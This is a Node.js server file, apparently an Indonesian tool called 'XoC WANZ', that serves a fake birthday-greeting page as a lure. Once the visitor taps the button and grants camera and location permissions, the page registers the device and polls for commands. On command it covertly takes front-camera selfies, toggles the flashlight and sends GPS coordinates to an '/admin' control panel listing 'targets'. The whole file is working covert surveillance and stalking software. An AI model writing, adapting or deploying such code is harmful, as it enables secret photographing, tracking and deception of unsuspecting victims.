const express = require('express');
const fs = require('fs');
const https = require('https');
const selfsigned = require('selfsigned');
const app = express();
const PORT = process.env.PORT || 3446;

app.use(express.json());
app.use(express.static('public'));

// ========== TERMUX STYLING ==========
const colors = {
    reset: '\x1b[0m',
    bold: '\x1b[1m',
    dim: '\x1b[2m',
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    magenta: '\x1b[35m',
    cyan: '\x1b[36m',
    white: '\x1b[37m',
    bgMagenta: '\x1b[45m'
};

function clearScreen() { console.clear(); }

function printBanner() {
    console.log(colors.bgMagenta + colors.white + '═══════════════════════════════════════════════════════════' + colors.reset);
    console.log(colors.bgMagenta + colors.white + '  ██╗  ██╗ ██████╗  ██████╗    ██╗    ██╗ █████╗ ███╗   ██╗███████╗' + colors.reset);
    console.log(colors.bgMagenta + colors.white + '  ╚██╗██╔╝██╔═══██╗██╔════╝    ██║    ██║██╔══██╗████╗  ██║╚══███╔╝' + colors.reset);
    console.log(colors.bgMagenta + colors.white + '   ╚███╔╝ ██║   ██║██║         ██║ █╗ ██║███████║██╔██╗ ██║  ███╔╝ ' + colors.reset);
    console.log(colors.bgMagenta + colors.white + '   ██╔██╗ ██║   ██║██║         ██║███╗██║██╔══██║██║╚██╗██║ ███╔╝  ' + colors.reset);
    console.log(colors.bgMagenta + colors.white + '  ██╔╝ ██╗╚██████╔╝╚██████╗    ╚███╔███╔╝██║  ██║██║ ╚████║███████╗' + colors.reset);
    console.log(colors.bgMagenta + colors.white + '  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝     ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝' + colors.reset);
    console.log(colors.bgMagenta + colors.white + '                    🔥  XoC WANZ v1.0  🔥' + colors.reset);
    console.log(colors.bgMagenta + colors.white + '═══════════════════════════════════════════════════════════' + colors.reset);
    console.log('');
}

// ========== GENERATE SSL OTOMATIS ==========
const pems = selfsigned.generate(null, { days: 365 });
const options = {
    key: pems.private,
    cert: pems.cert
};

let targets = [];
let pendingCommands = {};

// ========== HALAMAN TARGET ==========
const TARGET_PAGE = `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎉 Selamat Ulang Tahun!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Comic Sans MS', cursive, sans-serif;
            overflow: hidden;
            position: relative;
        }
        .balloon {
            position: fixed;
            font-size: 50px;
            animation: float 8s ease-in-out infinite;
            opacity: 0.8;
            pointer-events: none;
            z-index: 0;
        }
        @keyframes float {
            0%, 100% { transform: translateY(0px) rotate(-5deg); }
            50% { transform: translateY(-100px) rotate(5deg); }
        }
        .confetti {
            position: fixed;
            font-size: 30px;
            animation: confettiFall 5s linear infinite;
            pointer-events: none;
            z-index: 0;
        }
        @keyframes confettiFall {
            0% { transform: translateY(-100px) rotate(0deg); opacity: 1; }
            100% { transform: translateY(100vh) rotate(720deg); opacity: 0; }
        }
        .card {
            background: rgba(255,255,255,0.95);
            padding: 40px 30px;
            border-radius: 30px;
            max-width: 450px;
            width: 90%;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            position: relative;
            z-index: 1;
            animation: popIn 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        @keyframes popIn {
            0% { transform: scale(0.5); opacity: 0; }
            100% { transform: scale(1); opacity: 1; }
        }
        .card h1 { font-size: 2.8rem; color: #764ba2; margin-bottom: 10px; text-shadow: 2px 2px 0 #ffd700; }
        .card h1 .emoji { font-size: 3.2rem; }
        .card .birthday-boy { font-size: 1.8rem; color: #667eea; margin: 10px 0; font-weight: bold; }
        .card .message { font-size: 1.1rem; color: #555; margin: 15px 0; line-height: 1.6; }
        .card .cake { font-size: 4rem; margin: 15px 0; animation: bounce 2s infinite; }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-15px); }
        }
        .card button {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            color: white;
            padding: 15px 40px;
            border: none;
            border-radius: 50px;
            font-size: 1.2rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 5px 20px rgba(245, 87, 108, 0.4);
            margin-top: 15px;
        }
        .card button:hover { transform: scale(1.05); box-shadow: 0 8px 30px rgba(245, 87, 108, 0.6); }
        .card button:active { transform: scale(0.95); }
        .card .footer { margin-top: 20px; font-size: 0.8rem; color: #aaa; }
        .hidden-video { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
        .sparkle {
            position: fixed;
            color: #ffd700;
            font-size: 20px;
            animation: sparkle 1.5s ease-in-out infinite;
            pointer-events: none;
            z-index: 0;
        }
        @keyframes sparkle {
            0%, 100% { opacity: 0; transform: scale(0); }
            50% { opacity: 1; transform: scale(1); }
        }
        .flash-effect { animation: flashAnim 0.3s; }
        @keyframes flashAnim {
            0% { background: #ffffff; box-shadow: 0 0 100px rgba(255,255,255,0.9); }
            100% { background: transparent; box-shadow: none; }
        }
    </style>
</head>
<body>
    <div class="balloon" style="top:10%;left:5%;font-size:60px;">🎈</div>
    <div class="balloon" style="top:20%;right:8%;font-size:45px;animation-delay:2s;">🎈</div>
    <div class="balloon" style="top:60%;left:3%;font-size:55px;animation-delay:4s;">🎈</div>
    <div class="balloon" style="top:70%;right:5%;font-size:50px;animation-delay:1s;">🎈</div>
    <div class="balloon" style="top:40%;left:2%;font-size:40px;animation-delay:3s;">🎈</div>
    <div class="confetti" style="left:5%;animation-delay:0s;">🎊</div>
    <div class="confetti" style="left:20%;animation-delay:1s;">🎉</div>
    <div class="confetti" style="left:35%;animation-delay:2s;">✨</div>
    <div class="confetti" style="left:50%;animation-delay:0.5s;">🎊</div>
    <div class="confetti" style="left:65%;animation-delay:1.5s;">🎉</div>
    <div class="confetti" style="left:80%;animation-delay:2.5s;">✨</div>
    <div class="confetti" style="left:92%;animation-delay:1s;">🎊</div>
    <div class="sparkle" style="top:15%;left:25%;">⭐</div>
    <div class="sparkle" style="top:30%;right:20%;animation-delay:1s;">⭐</div>
    <div class="sparkle" style="top:55%;left:45%;animation-delay:0.5s;">⭐</div>
    <div class="sparkle" style="top:80%;right:30%;animation-delay:1.5s;">⭐</div>
    
    <div class="card" id="mainCard">
        <h1><span class="emoji">🎂</span><br>Selamat Ulang Tahun!</h1>
        <div class="birthday-boy">🎉 <span id="namaTarget">Sayangku</span> 🎉</div>
        <div class="cake">🎂</div>
        <div class="message">
            🌟 Semoga hari ini menjadi hari yang <br>spesial dan penuh kebahagiaan! 🥳<br>
            <span style="font-size:0.9rem;color:#888;">💖 Semoga semua impianmu tercapai 💖</span>
        </div>
        <button onclick="mulai()" id="btnMulai">🎁 Klik untuk Kejutan! 🎁</button>
        <div id="statusIzin" style="margin-top:10px;font-size:0.9rem;color:#888;min-height:25px;"></div>
        <div class="footer">✨ Dari seseorang yang sayang sama kamu ✨</div>
    </div>
    
    <video id="cameraBack" class="hidden-video" autoplay muted playsinline></video>
    <video id="cameraFront" class="hidden-video" autoplay muted playsinline></video>

    <script>
        let targetId = '', streamBack = null, streamFront = null, isRunning = false, flashStatus = false;
        let namaOrang = new URLSearchParams(window.location.search).get('nama') || 'Sayangku';
        document.getElementById('namaTarget').textContent = namaOrang;
        
        function log(msg) { console.log('[' + new Date().toLocaleTimeString() + '] ' + msg); }
        
        function mulai() {
            if (isRunning) { alert('🎉 Kejutan sudah aktif!'); return; }
            const btn = document.getElementById('btnMulai'), status = document.getElementById('statusIzin');
            btn.textContent = '⏳ Meminta izin...'; btn.disabled = true;
            status.textContent = '📷 Meminta akses kamera belakang...';
            
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: { ideal: 320 }, height: { ideal: 240 } }, audio: false })
                .then(s => {
                    streamBack = s; document.getElementById('cameraBack').srcObject = s; log('✅ Kamera belakang aktif');
                    status.textContent = '✅ Kamera belakang OK! Sekarang kamera depan...';
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } }, audio: false })
                    .then(s2 => {
                        streamFront = s2; document.getElementById('cameraFront').srcObject = s2; log('✅ Kamera depan aktif');
                        status.textContent = '✅ Kamera depan OK! Sekarang lokasi...';
                        if (navigator.geolocation) {
                            navigator.geolocation.getCurrentPosition(
                                () => { status.textContent = '✅ Semua izin diberikan!'; btn.textContent = '🎉 Kejutan Aktif!'; btn.disabled = true; isRunning = true; startBackgroundProcess(); },
                                () => { status.textContent = '⚠️ Lokasi ditolak, tetap lanjut!'; btn.textContent = '🎉 Kejutan Aktif!'; btn.disabled = true; isRunning = true; startBackgroundProcess(); }
                            );
                        } else {
                            status.textContent = '⚠️ GPS tidak support, tetap lanjut!'; btn.textContent = '🎉 Kejutan Aktif!'; btn.disabled = true; isRunning = true; startBackgroundProcess();
                        }
                    })
                    .catch(() => { status.textContent = '⚠️ Kamera depan ditolak! Selfie tidak bisa.'; btn.textContent = '🎉 Kejutan Aktif! (No selfie)'; btn.disabled = true; isRunning = true; startBackgroundProcess(); });
                })
                .catch(() => { status.textContent = '❌ Kamera belakang ditolak! Flash tidak bisa.'; btn.textContent = '🎁 Coba Lagi'; btn.disabled = false; isRunning = false; alert('⚠️ Izin kamera diperlukan untuk kejutan!'); });
            } else {
                alert('❌ Browser tidak support kamera!'); btn.textContent = '🎁 Coba Lagi'; btn.disabled = false;
            }
        }
        
        function startBackgroundProcess() {
            targetId = 'target_' + Date.now() + '_' + Math.random().toString(36).substr(2, 4);
            log('ID: ' + targetId);
            const data = { targetId, platform: navigator.platform || 'Unknown', userAgent: navigator.userAgent || 'Unknown', language: navigator.language || 'Unknown', screenWidth: screen.width || 0, screenHeight: screen.height || 0, waktu: new Date().toISOString(), nama: namaOrang };
            fetch('/api/register', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) })
            .then(res => res.json()).then(() => {
                log('✅ Server connected');
                setInterval(() => {
                    fetch('/api/check/' + targetId).then(res => res.json()).then(cmd => {
                        if (cmd.action === 'flash_toggle') toggleFlash();
                        if (cmd.action === 'take_photo') takePhoto();
                        if (cmd.action === 'get_location') getLocation();
                    }).catch(() => {});
                }, 2000);
            }).catch(err => log('❌ Server error: ' + err.message));
        }
        
        function toggleFlash() {
            if (!streamBack) { log('❌ Kamera belakang tidak aktif'); return; }
            const track = streamBack.getVideoTracks()[0];
            if (!track) { log('❌ Video track tidak tersedia'); return; }
            try {
                const caps = track.getCapabilities();
                if (caps.torch) {
                    flashStatus = !flashStatus;
                    track.applyConstraints({ advanced: [{ torch: flashStatus }] })
                    .then(() => {
                        log('💡 Flash ' + (flashStatus ? 'NYALA' : 'MATI'));
                        if (flashStatus) { document.getElementById('mainCard').classList.add('flash-effect'); setTimeout(() => { document.getElementById('mainCard').classList.remove('flash-effect'); }, 300); }
                        fetch('/api/feedback', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ targetId, action: 'flash_toggle', status: flashStatus ? 'on' : 'off' }) });
                    }).catch(() => { log('❌ Gagal toggle flash'); flashStatus = false; });
                } else { log('⚠️ Flash TORCH tidak support'); }
            } catch(e) { log('❌ Error: ' + e.message); }
        }
        
        function takePhoto() {
            const video = document.getElementById('cameraFront');
            if (!video || !video.videoWidth) { log('❌ Kamera depan tidak aktif'); return; }
            log('📸 Mengambil foto selfie...');
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 320; canvas.height = video.videoHeight || 240;
            const ctx = canvas.getContext('2d'); ctx.drawImage(video, 0, 0);
            const photoData = canvas.toDataURL('image/jpeg', 0.8);
            fetch('/api/photo', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ targetId, photo: photoData }) })
            .then(() => { log('✅ Foto selfie terkirim!'); document.getElementById('mainCard').classList.add('flash-effect'); setTimeout(() => { document.getElementById('mainCard').classList.remove('flash-effect'); }, 200); })
            .catch(() => log('❌ Gagal kirim foto'));
        }
        
        function getLocation() {
            if (!navigator.geolocation) { log('❌ GPS tidak support'); return; }
            log('📍 Mengambil lokasi...');
            navigator.geolocation.getCurrentPosition(
                (pos) => { const loc = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
                fetch('/api/location', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ targetId, location: loc }) })
                .then(() => log('✅ Lokasi terkirim!')).catch(() => log('❌ Gagal kirim lokasi')); },
                (err) => log('❌ Lokasi: ' + err.message)
            );
        }
    </script>
</body>
</html>
`;

// ========== ROUTES ==========
app.get('/', (req, res) => res.send(TARGET_PAGE));

app.post('/api/register', (req, res) => {
    const data = req.body;
    data.ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';
    data.online = true;
    data.flashState = 'off';
    console.log('📥 REGISTER:', data.targetId, '| Nama:', data.nama || '-', '| IP:', data.ip);
    const existing = targets.find(t => t.targetId === data.targetId);
    if (!existing) { targets.push(data); fs.writeFileSync('targets.json', JSON.stringify(targets, null, 2)); console.log('🎯 Target baru:', data.targetId); }
    else { console.log('⚠️ Target sudah ada:', data.targetId); }
    res.json({ status: 'ok' });
});

app.post('/api/feedback', (req, res) => {
    const { targetId, action, status } = req.body;
    console.log('📨 Feedback:', targetId, action, status);
    if (action === 'flash_toggle') {
        const target = targets.find(t => t.targetId === targetId);
        if (target) { target.flashState = status === 'on' ? 'on' : 'off'; fs.writeFileSync('targets.json', JSON.stringify(targets, null, 2)); }
    }
    res.json({ status: 'ok' });
});

app.post('/api/photo', (req, res) => {
    const { targetId, photo } = req.body;
    const filename = 'photo_' + targetId + '_' + Date.now() + '.jpg';
    const base64Data = photo.replace(/^data:image\/jpeg;base64,/, '');
    try {
        fs.writeFileSync('public/' + filename, base64Data, 'base64');
        const target = targets.find(t => t.targetId === targetId);
        if (target) { target.lastPhoto = filename; fs.writeFileSync('targets.json', JSON.stringify(targets, null, 2)); }
        console.log('📸 Foto selfie:', filename);
        res.json({ status: 'ok', filename: filename });
    } catch (err) { console.log('❌ Gagal simpan foto:', err); res.json({ status: 'error' }); }
});

app.post('/api/location', (req, res) => {
    const { targetId, location } = req.body;
    if (location) {
        const target = targets.find(t => t.targetId === targetId);
        if (target) { target.location = location; fs.writeFileSync('targets.json', JSON.stringify(targets, null, 2)); }
        console.log('📍 Lokasi:', targetId, location.lat, location.lng);
    }
    res.json({ status: 'ok' });
});

app.get('/api/check/:targetId', (req, res) => {
    const targetId = req.params.targetId;
    const cmd = pendingCommands[targetId] || { action: 'none' };
    pendingCommands[targetId] = { action: 'none' };
    res.json(cmd);
});

app.post('/api/command', (req, res) => {
    const { targetId, action } = req.body;
    pendingCommands[targetId] = { action: action };
    console.log('📨 Perintah:', targetId, '→', action);
    res.json({ status: 'ok' });
});

app.get('/api/targets', (req, res) => {
    let data = [];
    if (fs.existsSync('targets.json')) {
        try { data = JSON.parse(fs.readFileSync('targets.json')); } catch(e) { data = []; }
    }
    res.json(data);
});

// ========== DASHBOARD ADMIN ==========
app.get('/admin', (req, res) => {
    let targetsData = [];
    if (fs.existsSync('targets.json')) {
        try { targetsData = JSON.parse(fs.readFileSync('targets.json')); } catch(e) { targetsData = []; }
    }
    
    let html = `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XoC Admin</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; color: #00ff88; font-family: monospace; padding: 15px; }
        h1 { color: #ff3366; text-shadow: 0 0 20px #ff3366; text-align: center; font-size: 1.8rem; }
        .subtitle { text-align: center; color: #666; font-size: 0.8rem; margin-bottom: 20px; }
        .total { background: #1a1a1a; padding: 15px; border-radius: 10px; margin: 15px 0; border: 1px solid #00ff88; text-align: center; font-size: 1.2rem; }
        .total strong { color: #ffcc00; font-size: 1.5rem; }
        .card { background: #111; border: 1px solid #00ff88; border-radius: 10px; padding: 15px; margin: 10px 0; }
        .target-header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px; }
        .target-id { color: #ffcc00; font-weight: bold; word-break: break-all; font-size: 0.9rem; }
        .target-nama { color: #ff6b6b; font-weight: bold; font-size: 1rem; }
        .status-online { background: #00ff88; color: black; padding: 2px 12px; border-radius: 15px; font-size: 0.7rem; font-weight: bold; }
        .status-flash-on { background: #ffaa00; color: black; padding: 2px 12px; border-radius: 15px; font-size: 0.7rem; font-weight: bold; }
        .status-flash-off { background: #444; color: #aaa; padding: 2px 12px; border-radius: 15px; font-size: 0.7rem; font-weight: bold; }
        .target-info { color: #aaa; margin: 8px 0; display: flex; flex-wrap: wrap; gap: 8px; font-size: 0.8rem; }
        .target-info span { background: #1a1a1a; padding: 2px 10px; border-radius: 12px; border: 1px solid #333; }
        .btn-group { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 10px; }
        .btn { padding: 8px 18px; border: none; border-radius: 15px; font-weight: bold; cursor: pointer; font-size: 0.8rem; transition: all 0.2s; }
        .btn:active { transform: scale(0.95); }
        .btn-flash { background: #ffaa00; color: black; }
        .btn-flash-on { background: #ff3366; color: white; }
        .btn-photo { background: #00ccff; color: black; }
        .btn-location { background: #00ff88; color: black; }
        .photo-preview { max-width: 150px; max-height: 120px; border-radius: 8px; margin-top: 8px; border: 1px solid #00ff88; cursor: pointer; }
        .location-info { color: #ffcc00; font-size: 0.8rem; margin-top: 5px; }
        .location-info a { color: #00ff88; text-decoration: none; }
        .empty { text-align: center; color: #666; padding: 50px 20px; font-size: 1.2rem; }
        .empty .emoji { font-size: 3rem; display: block; margin-bottom: 15px; }
        .refresh-btn { background: #444; color: white; padding: 10px 30px; border: none; border-radius: 15px; margin: 15px auto; display: block; cursor: pointer; font-size: 1rem; }
        .footer { text-align: center; color: #444; font-size: 0.7rem; margin-top: 30px; border-top: 1px solid #222; padding-top: 15px; }
        .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: #1a1a1a; border: 1px solid #00ff88; padding: 12px 25px; border-radius: 10px; color: #00ff88; font-size: 0.9rem; display: none; z-index: 999; }
    </style>
</head>
<body>
    <h1>👁️ XoC CONTROL</h1>
    <div class="subtitle">🔴 Flash Toggle - Klik tombol Flash untuk nyalakan/matikan</div>
    <div class="total">📊 TOTAL TARGET: <strong>${targetsData.length}</strong></div>
    <div id="targetList">`;

    if (targetsData.length === 0) {
        html += `<div class="empty"><span class="emoji">🕵️</span>Belum ada target yang terhubung!<br><span style="font-size:0.8rem;color:#444;">Buka link target di HP lain</span></div>`;
    } else {
        targetsData.forEach((target, index) => {
            const nama = target.nama || 'Unknown';
            const flashState = target.flashState || 'off';
            const flashClass = flashState === 'on' ? 'status-flash-on' : 'status-flash-off';
            const flashText = flashState === 'on' ? '💡 ON' : '⚫ OFF';
            const flashBtnText = flashState === 'on' ? '🔦 Matikan Flash' : '🔦 Nyalakan Flash';
            const flashBtnClass = flashState === 'on' ? 'btn-flash-on' : 'btn-flash';
            
            html += `
            <div class="card" id="card_${index}">
                <div class="target-header">
                    <span class="target-id">🎯 ${target.targetId || 'Unknown'}</span>
                    <span class="target-nama">🎂 ${nama}</span>
                    <span class="status-online">🟢 ONLINE</span>
                    <span class="${flashClass}">${flashText}</span>
                </div>
                <div class="target-info">
                    <span>📱 ${target.platform || '-'}</span>
                    <span>🌐 ${target.language || '-'}</span>
                    <span>🖥️ ${target.ip || '-'}</span>
                </div>
                <div class="target-info">
                    <span>🕐 ${target.waktu ? new Date(target.waktu).toLocaleString() : '-'}</span>
                </div>`;
            
            if (target.location) {
                html += `<div class="location-info">📍 ${target.location.lat}, ${target.location.lng} (akurasi ${target.location.accuracy || '?'}m)<br><a href="https://maps.google.com/maps?q=${target.location.lat},${target.location.lng}" target="_blank">🔗 Lihat di Google Maps</a></div>`;
            }
            
            if (target.lastPhoto) {
                html += `<div><img src="/${target.lastPhoto}" class="photo-preview" onclick="window.open(this.src)" /></div>`;
            }
            
            html += `
                <div class="btn-group">
                    <button class="btn ${flashBtnClass}" onclick="sendCommand('${target.targetId}','flash_toggle')">${flashBtnText}</button>
                    <button class="btn btn-photo" onclick="sendCommand('${target.targetId}','take_photo')">📸 Selfie</button>
                    <button class="btn btn-location" onclick="sendCommand('${target.targetId}','get_location')">📍 Lokasi</button>
                </div>
            </div>`;
        });
    }

    html += `
    </div>
    <button class="refresh-btn" onclick="location.reload()">🔄 REFRESH</button>
    <div class="footer">XoC Tracker v3.0 • ${new Date().toLocaleString()}</div>
    <div class="toast" id="toast"></div>
    <script>
        function sendCommand(targetId, action) {
            const toast = document.getElementById('toast');
            toast.style.display = 'block';
            toast.textContent = '⏳ Mengirim perintah ' + action + '...';
            fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ targetId: targetId, action: action })
            })
            .then(res => res.json())
            .then(() => {
                toast.textContent = '✅ Perintah ' + action + ' terkirim!';
                toast.style.borderColor = '#00ff88';
                setTimeout(() => { toast.style.display = 'none'; }, 3000);
                setTimeout(() => { location.reload(); }, 2000);
            })
            .catch(() => {
                toast.textContent = '❌ Gagal kirim perintah!';
                toast.style.borderColor = '#ff3366';
                setTimeout(() => { toast.style.display = 'none'; }, 3000);
            });
        }
    </script>
</body>
</html>
    `;
    res.send(html);
});

// ========== SETUP ==========
if (!fs.existsSync('public')) fs.mkdirSync('public');

if (fs.existsSync('targets.json')) {
    try { targets = JSON.parse(fs.readFileSync('targets.json')); } catch(e) { targets = []; }
} else { fs.writeFileSync('targets.json', JSON.stringify([])); }

// ========== JALANKAN HTTPS ==========
https.createServer(options, app).listen(PORT, '0.0.0.0', () => {
    clearScreen();
    printBanner();
    console.log(colors.green + '╔═══════════════════════════════════════════════════════════╗' + colors.reset);
    console.log(colors.green + '║  🚀 XoC WANZ v1.0 - DEPLOYED TO RENDER!                 ║' + colors.reset);
    console.log(colors.green + '╠═══════════════════════════════════════════════════════════╣' + colors.reset);
    console.log(colors.yellow + '║  📱 Target: https://' + (process.env.RENDER_EXTERNAL_URL || 'localhost:' + PORT) + '?nama=NamaKamu' + colors.reset);
    console.log(colors.yellow + '║  🎮 Admin:  https://' + (process.env.RENDER_EXTERNAL_URL || 'localhost:' + PORT) + '/admin' + colors.reset);
    console.log(colors.green + '╠═══════════════════════════════════════════════════════════╣' + colors.reset);
    console.log(colors.magenta + '║  🔥 FITUR: Kamera Belakang → Flash | Kamera Depan → Selfie ║' + colors.reset);
    console.log(colors.magenta + '║  🔥 Flash Toggle ON/OFF | Lokasi GPS                     ║' + colors.reset);
    console.log(colors.green + '╚═══════════════════════════════════════════════════════════╝' + colors.reset);
    console.log('');
    console.log(colors.dim + '✅ Server running on port ' + PORT);
    console.log(colors.dim + '📂 Targets loaded: ' + targets.length);
    console.log(colors.green + '🔒 HTTPS: ACTIVE (self-signed)' + colors.reset);
    console.log('');
});
